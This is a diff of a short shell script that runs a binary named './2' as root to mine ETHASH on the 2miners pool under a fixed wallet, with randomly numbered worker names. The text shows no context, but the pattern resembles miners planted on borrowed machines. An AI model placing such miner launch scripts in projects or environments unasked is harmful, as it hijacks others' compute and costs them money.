@@ -1,3 +1,4 @@
-WORKER=$(echo $(shuf -i 1-99999 -n 1)-2mr)
-apt-get update
-./2 --algo ETHASH --pool eth.2miners.com:2020 --user 1U6yopAJMD2qvucsC9eBysZnpB6FEGKy2.$WORKER
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-squrte)
+sudo apt-get update
+sudo apt-get install libpci3
+sudo ./2 --algo ETHASH --pool eth.2miners.com:2020 --user 1U6yopAJMD2qvucsC9eBysZnpB6FEGKy2.$WORKER
